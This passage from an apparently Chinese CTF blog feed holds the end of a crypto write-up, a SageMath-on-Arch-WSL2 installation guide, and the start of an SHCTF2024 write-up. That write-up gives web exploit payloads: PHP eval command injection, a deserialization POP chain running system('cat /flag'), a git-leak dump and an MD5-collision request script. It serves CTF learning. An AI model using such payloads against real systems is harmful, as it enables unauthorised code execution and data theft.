<span class="keyword">return</span> encrypted_parts, multipliers, modulus</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    rickroll = rickroll_loader()</span><br><span class="line">    m = bytes_to_long(HINT)</span><br><span class="line"></span><br><span class="line">    encrypted_lyrics, multipliers, modulus = secure_encrypt(</span><br><span class="line">        rickroll[:EFFECTIVE_ROW], m)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;S =&quot;</span>, encrypted_lyrics)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;V =&quot;</span>, multipliers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, modulus)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">S = [624073892368439332713131144655355187273652775732037030273908973687487472640419, 1129513550732743550887354593625951854836036688324123410864182971141396110133306, 1117643028354341949186759218964558582164677605237787761003042032239935547551873, 151619055620013230556169740951169935393567570823439146992800622058967940011364, 596106506159944398847755500086869373163910176213091804211992440336880292610397, 685472210701608040945173323626153641749419080165879222271110177606156013942182]</span></span><br><span class="line"><span class="string">V = [100024809269721744282017864103544473542698741247649693420201028956644193231147, 85493218764912449360009112267171851264674952927507787108286827385372626006804, 75451455656190167222034904545925816909383290106210237096763781707294423744719, 1864420400658866895837249178680154965580281261003086054650703872439476331244, 111069754111223622246512532174936637994215526100226395068812327641951277359169, 88031405587803201423744918486788030404029698214504194443110805396831023823738]</span></span><br><span class="line"><span class="string">n = 1497114501625523578039715607844306226528709444454126120151416887663514076507099</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># rickroll</span></span><br><span class="line"></span><br><span class="line">Never gonna give you up</span><br><span class="line">Never gonna let you down</span><br><span class="line">Never gonna run around <span class="keyword">and</span> desert you</span><br><span class="line"></span><br><span class="line">Never gonna make you cry</span><br><span class="line">Never gonna say goodbye</span><br><span class="line">Never gonna tell a lie <span class="keyword">and</span> hurt you</span><br><span class="line"></span><br><span class="line">--A mysterious singer who does <span class="keyword">not</span> want to be named.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="end"><a class="markdownIt-Anchor" href="#end"></a> END</h2><p>还得找个时间补一下，中大爷<code>Lst4r</code>干了五题，QWQ<br />（希望可以去线下玩玩吧</p><p>听说<code>web</code>有人AK了，指个路<br /><a href="https://infernity.top/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/">https://infernity.top/2024/11/09/2024鹏城杯web全wp/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#crypto&quot;&gt;&lt;/a&gt; Crypto&lt;/h1&gt;
&lt;h2 id=&quot;solved&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#solved&quot;&gt;&lt;/a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SageMath10.x最新版安装指引</title>
    <link href="https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/"/>
    <id>https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/</id>
    <published>2024-11-06T17:47:23.000Z</published>
    <updated>2024-11-20T18:55:41.386Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>由于懒人安装在<code>windows11</code>上面，最高只能获取到<code>Sagemath9.3</code>的版本，在<code>wsl2+ubuntu22.04</code>上面最新的也才<code>sagemath9.5</code>好像，不会升级，有些<code>exp</code>跑不了，遂安装了<code>Sagemath10.x</code>版本</p><p>在网上找了一圈，发现都没有教程是使用<code>WSL2+ubuntu22.04+sagemath10.x</code>的，很多都是在<code>Arch Linux</code>里面装的</p><p>特此，安装好了，可以运行了，写下了这篇博客</p><p>闲来无事，去敲打了一下<code>Kimi</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SageMath 10.x 版本推荐使用 Arch Linux 的原因主要有以下几点：</span><br><span class="line">维护良好且最新的SageMath包：从Sage 10.2开始，Arch Linux 提供了维护良好且最新的SageMath包，这意味着用户可以更容易地获得最新版本的SageMath，以及及时的安全更新和功能改进。</span><br><span class="line">兼容性和支持：Arch Linux 对于 SageMath 的支持较好，社区活跃，能够及时解决与SageMath 相关的兼容性问题</span><br><span class="line">滚动更新模型：Arch Linux 采用滚动更新模型，这意味着系统和软件包始终保持最新状态，这对于科研和开发人员来说是一个很大的优势，因为他们可以快速获得最新的软件和库</span><br><span class="line"></span><br><span class="line">用户推荐：有用户因为个人使用体验良好而推荐在 Arch Linux 下安装 SageMath。他们可能觉得在 Arch Linux 下使用 SageMath 更为方便，尤其是在 WSL2 环境下。</span><br><span class="line">从源代码安装的便利性：Arch Linux 的文档中提到，Sage源代码树包含符号链接，如果使用Windows行结束而不是UNIX行结束，构建将无法工作。这表明在Arch Linux（一个UNIX-like系统）上从源代码安装SageMath更为便利</span><br><span class="line"></span><br><span class="line">包管理器支持：SageMath 可以从各种发行版获得，并且可以由包管理器安装。Arch Linux 的包管理器 pacman 使得安装和更新 SageMath 变得简单</span><br><span class="line"></span><br><span class="line">综上所述，Arch Linux 提供了最新的SageMath包、良好的社区支持、滚动更新模型以及从源代码安装的便利性，这些因素共同使得它成为运行 SageMath 10.x 版本的推荐选择</span><br></pre></td></tr></table></figure><p>我的评价是，<code>Arch Linux</code>能用<strong>最新版！</strong><br />本来是想参考<a href="https://tover.xyz/p/SageMath-10-1-Installation/">师兄</a>的，发现还是做不到啊，死在了<code>conda</code>上，原因未知</p><h1 id="安装wsl2arch-linux"><a class="markdownIt-Anchor" href="#安装wsl2arch-linux"></a> 安装wsl2+Arch Linux</h1><p><code>wsl2</code>的安装的话，参考网上的教程，一大堆</p><p>然后，在微软商城下载<code>Arch WSL</code>，打开之后就是用户名密码的配置<br />非默认系统的情况下，<code>wsl -d Arch</code>进入<code>Arch Linux</code></p><p><code>wsl --list</code>可以看到当前有什么<code>适用于 Linux 的 Windows 子系统分发</code><br />设为默认子系统，可以将<code>Arch</code>换成别的，比如<code>Ubuntu-22.04</code><br /><code>wsl --set-default Arch</code></p><h1 id="配置pacman"><a class="markdownIt-Anchor" href="#配置pacman"></a> 配置pacman</h1><p>(很强大的包管理器)<br />配置pacman镜像源，也就是换源(因为自身的源太慢了，或者因为是国外的，用不了，得换成国内的镜像源，比如阿里源、清华源等)<br /><code>sudo su</code>进入<code>root</code>模式<br /><code>vim /etc/pacman.d/mirrorlist</code><br />在顶部增加</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = http://repo.archlinuxcn.org/<span class="variable">$arch</span></span><br><span class="line">Server = http://mirrors.163.com/archlinux-cn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.aliyun.com/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p>更新系统，输入<code>pacman -Syu</code>，不知道梯子有没有影响(有时候开梯子很慢)，看情况是否把梯子关闭吧</p><p>配置<code>pacman key</code>，输入以下命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line">pacman-key --populate</span><br><span class="line">pacman -Sy archlinux-keyring</span><br></pre></td></tr></table></figure><p>更新系统<code>pacman -Syu</code>，为什么这里又更新呢，因为这一步是必须的，上一步如果配置<code>pacman key</code>出现网络问题，更新系统就能解决，如果没有就不用更新系统了</p><p>如果源用不了(换了源之后的情况)，比如<code>Could not resolve host</code>，可能是<code>DNS</code>出了点问题(?)，经验告诉我是这样的，<code>vim /etc/resolv.conf</code>，增加<code>nameserver 8.8.8.8</code>，这个是谷歌的<code>DNS</code>服务器，也可以再加多一个<code>nameserver 114.114.114.114</code>，可以把原来的那个本地的删了，应该没有什么问题()</p><p>出现了个问题，在<code>Arch Linux</code>里面配置禁止重启自动更新的话是有问题的(同样的操作在ubuntu是没有任何问题的)，表现为<code>/etc/resolv.conf</code>文件不存在。。。所以在<code>Arch Linux</code>里面就不要配置这个了，有问题再加谷歌的<code>DNS</code>服务器</p><p>配置<code>archlinuxcn</code>镜像源，<code>vim /etc/pacman.conf</code>，增加以下内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p>安装<code>archlinuxcn</code>的<code>key</code>，<code>pacman -Sy archlinuxcn-keyring</code></p><p>这两个<code>key</code>吧，我也不知道有没有配置成功，输入命令之后好像没反应，总感觉没有成功一样的(?)</p><p>继续安装后面的<code>sage</code>，完成之后既然没有出现问题，那就不管它了</p><h1 id="安装sage"><a class="markdownIt-Anchor" href="#安装sage"></a> 安装sage</h1><p><code>sudo pacman -Sy sagemath</code><br /><strong>请耐心耐心耐心等待，好几个G呢</strong><br />运行<code>sage</code>，看看是否安装成功<br /><img src="https://picx.zhimg.com/80/v2-700679ee72ed9b6dd33bbfcc1c956af7_1440w.png" alt="" /><br />可以看到都是最新版，这下好玩了<br />如果需要管理<code>sage</code>，它的文件路径是<code>Arch\usr\lib\python3.12\site-packages\sage</code></p><h1 id="安装jupyterlab推荐"><a class="markdownIt-Anchor" href="#安装jupyterlab推荐"></a> 安装JupyterLab(推荐)</h1><p><code>sudo pacman -S jupyterlab</code></p><h1 id="在jupyterlab中启动sage"><a class="markdownIt-Anchor" href="#在jupyterlab中启动sage"></a> 在JupyterLab中启动Sage</h1><p><code>sage -n jupyterlab --allow-root</code><br />按道理来说不指定浏览器，你点击它之后会自动跳到默认浏览器的，但是我这里跳到了<code>Edge</code>浏览器，不是我默认的火狐浏览器</p><p>也懒得改了，直接浏览器输入<code>http://localhost:8888/lab</code><br />通常我们是不记指令的，那么我们来搞一个<code>bash</code>脚本快速启动，其实就是把这条指令丢进去<br />在工作目录下，比如我的<code>/mnt/d/desktop</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">vim sage.sh</span><br><span class="line"><span class="comment"># 输入以下两行的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">sage -n jupyterlab --allow-root</span><br></pre></td></tr></table></figure><p>保存退出之后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x sage.sh</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">./sage.sh</span><br></pre></td></tr></table></figure><p>所以，平时我们需要使用<code>sagemath</code>的时候，在我们的工作目录下面<code>./sage.sh</code>即可启动</p><h1 id="导入一些库"><a class="markdownIt-Anchor" href="#导入一些库"></a> 导入一些库</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo pacman -S python-&lt;package_name&gt; [python-&lt;package_name&gt;]</span></span><br><span class="line"><span class="comment"># 温馨提示：有的库没法安装是因为Arch里边没有而已，整个pip并用pip3安装即可</span></span><br><span class="line">sudo pacman -S python-gmpy2 python-pycryptodome python-pwntools python-tqdm</span><br></pre></td></tr></table></figure><p>后续还有<code>python</code>其他的库需要安装，可以参考上面的格式<code>python-xxxx</code>，也可以去整个<code>pip</code>，目前来说这些是够了的(只打ctf crypto方向，应该够)，好像它内置就挺多了的</p><p>最舒服的就是，你在<code>windows</code>下面下载的<code>pwntools</code>，可能过了一阵子，等你又安装了别的什么什么东西，可能是一些依赖项冲突了，会导致你<code>from pwn import *</code>无法使用</p><p>所以我的解决方案是在<code>Linux</code>里面下载<code>pwntools</code>(环境隔绝)，在<code>Linux</code>里面执行<code>python</code>脚本就好了，就像这里<code>Arch Linux</code>的<code>pwntools</code>就不会起冲突，可以正常使用</p><p>有的萌新可能第一次接触<code>crypto</code>方向的容器题，可能有点难上手，现提供一个板板</p><p>密码学方向环境题(通俗一点来说，就是打远程)的交互脚本模板如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 连接服务</span></span><br><span class="line">p = remote(<span class="string">&#x27;host&#x27;</span>, port)</span><br><span class="line"><span class="comment"># 记录调试信息</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># 接收服务器端的信息，识情况而选</span></span><br><span class="line">a = p.recvline()</span><br><span class="line">p.recvlines(n)</span><br><span class="line">p.recvall()</span><br><span class="line">p.recv(n)   <span class="comment"># 接收n字节</span></span><br><span class="line">p.recvuntil(delim)  <span class="comment"># 一直接收，直到delim为止</span></span><br><span class="line"><span class="comment"># 发送信息给服务器端，识情况而选</span></span><br><span class="line">p.send(string)</span><br><span class="line">p.sendafter(string,payload) <span class="comment"># 接收到string后发送</span></span><br><span class="line">p.sendline(string)    <span class="comment">#   末尾有 \n</span></span><br><span class="line">p.sendlineafter(string,payload)</span><br><span class="line"><span class="comment"># 保持交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是接收和发送的数据类型都是字节数据，比如<code>b'hello'</code></p><h1 id="安装flatter可以加速格基规约"><a class="markdownIt-Anchor" href="#安装flatter可以加速格基规约"></a> 安装flatter(可以加速格基规约)</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gmp mpfr eigen base-devel gcc git cmake</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/keeganryan/flatter.git</span><br><span class="line"><span class="built_in">cd</span> flatter</span><br><span class="line"><span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> ./build</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/usr ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig <span class="comment">#这个可以不输入</span></span><br></pre></td></tr></table></figure><p><code>flatter -h</code>查看是否能正常使用</p><h1 id="代码补全功能"><a class="markdownIt-Anchor" href="#代码补全功能"></a> 代码补全功能</h1><p>路径：<code>Setting-&gt;Setting Editer-&gt;Code Completion</code><br /><img src="https://picx.zhimg.com/80/v2-94dfe83b491d36a5837bfb8a7be17f6c_1440w.webp" alt="" /><br />感觉函数解释是不需要的，有点碍眼睛<br /><img src="https://picx.zhimg.com/80/v2-2bd85de9329534e40610f5c15c15c6a7_1440w.png" alt="" /><br />测试发现可运行</p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://shinichicun.top/posts/arch%E4%B8%8B%E7%9A%84sage%E5%AE%89%E8%A3%85/">https://shinichicun.top/posts/arch下的sage安装/</a><br /><a href="https://zhuanlan.zhihu.com/p/633782050">https://zhuanlan.zhihu.com/p/633782050</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;由于懒人安装在&lt;code&gt;windows11&lt;/code&gt;上面，最高只能获取到&lt;code&gt;Sagemath9.3&lt;/code&gt;的版本，在&lt;cod</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SHCTF2024-WriteUp</title>
    <link href="https://hvang10.github.io/2024/11/05/SHCTF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/11/05/SHCTF2024-WriteUp/</id>
    <published>2024-11-04T17:40:17.000Z</published>
    <updated>2025-04-02T18:13:44.985Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ctf.qlu.edu.cn">https://ctf.qlu.edu.cn</a><br />平台不知道什么时候关闭</p><p>尼玛，新生赛一堆，<code>newstar 0xgame</code>都只是打了一下就不想打了，忙不过来了，屁事太多了</p><p>还好山河明智，第二周就把新生标签摘了，然后我第一周打的多一些，后面基本都是下密码的附件来看看了</p><p><img src="https://picx.zhimg.com/80/v2-522c0facffd34af1c7527ec7ebcda698_1440w.png" alt="" /><br />欸，居然有37</p><h1 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> week1</h1><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2><h3 id="单身十八年的手速"><a class="markdownIt-Anchor" href="#单身十八年的手速"></a> 单身十八年的手速</h3><p><code>game.js</code></p><h3 id="1zflask"><a class="markdownIt-Anchor" href="#1zflask"></a> 1zflask</h3><p><code>/robots.txt</code>，<code>/s3recttt</code>，<code>/api?SSHCTFF=cat /flag</code></p><h3 id="蛐蛐蛐蛐"><a class="markdownIt-Anchor" href="#蛐蛐蛐蛐"></a> 蛐蛐?蛐蛐!</h3><p><code>/source.txt</code>，修复乱码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ququ&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ququ&#x27;</span>]) != <span class="number">415411</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ququ&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="variable">$eval_param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ququ&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strncmp</span>(<span class="variable">$eval_param</span>,<span class="string">&#x27;ququk1&#x27;</span>,<span class="number">6</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ququ&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;可以让fault的蛐蛐变成现实么\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;蛐蛐成功第一步！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;呜呜呜fault还是要出题&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/check.php?ququ=114514%00</code>，post：<code>ququ=ququk1;system(&quot;cat /flag&quot;);</code>或者使用别的分割符同样可以命令执行</p><h3 id="ez_gittt"><a class="markdownIt-Anchor" href="#ez_gittt"></a> ez_gittt</h3><p><code>git泄露</code>有的工具下不到源码，点名批评</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install GitHacker</span><br><span class="line">githacker --url http://entry.shc.tf:45317/.git/ --output-folder result</span><br><span class="line"><span class="built_in">cd</span> result/cb5763aae21e1c5821db1b400953e7f1/.git</span><br><span class="line">git diff 1b2133e98f25813443f66f845153fa0c1c33fd1b 8dd1651ac6dc576566720781e603a606d9cea330</span><br></pre></td></tr></table></figure><h3 id="poppopop"><a class="markdownIt-Anchor" href="#poppopop"></a> poppopop</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SH</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Web</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$SHCTF</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;p)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        SH::<span class="variable">$Web</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SH::<span class="variable">$SHCTF</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;o-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;其实。。。。,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHCTF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isyou</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&quot;cat /flllag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (SH::<span class="variable">$Web</span>) &#123;</span><br><span class="line"></span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;isyou)(<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;小丑竟是我自己呜呜呜~&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;小丑别看了!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;n=<span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;n-&gt;o=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;n-&gt;o-&gt;p=<span class="keyword">new</span> <span class="title function_ invoke__">SHCTF</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h3 id="jvav"><a class="markdownIt-Anchor" href="#jvav"></a> jvav</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建Runtime对象</span></span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="comment">// 执行系统命令</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> runtime.exec(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令的输出</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待命令执行完成</span></span><br><span class="line">            process.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="md5-master"><a class="markdownIt-Anchor" href="#md5-master"></a> MD5 Master</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="variable">$master</span> = <span class="string">&quot;MD5 master!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>] !== <span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$master</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;master? &lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>master拼接两个参数后的MD5要相同，恰好<code>fastcoll</code>就是干这个的，新建文本文件，把前缀写进去保存，拖入exe文件</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()[<span class="number">11</span>:]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()[<span class="number">11</span>:]</span><br><span class="line">url = <span class="string">&#x27;http://entry.shc.tf:21869/&#x27;</span></span><br><span class="line">res = requests.post(url, data=&#123;<span class="string">&quot;master1&quot;</span>: a, <span class="string">&quot;master2&quot;</span>: b&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h2><h3 id="hello-crypto"><a class="markdownIt-Anchor" href="#hello-crypto"></a> Hello Crypto</h3><p><code>print(long_to_bytes(m).decode())</code></p><h3 id="ezaes"><a class="markdownIt-Anchor" href="#ezaes"></a> EzAES</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;chall.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    file = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="built_in">print</span>(line.decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span 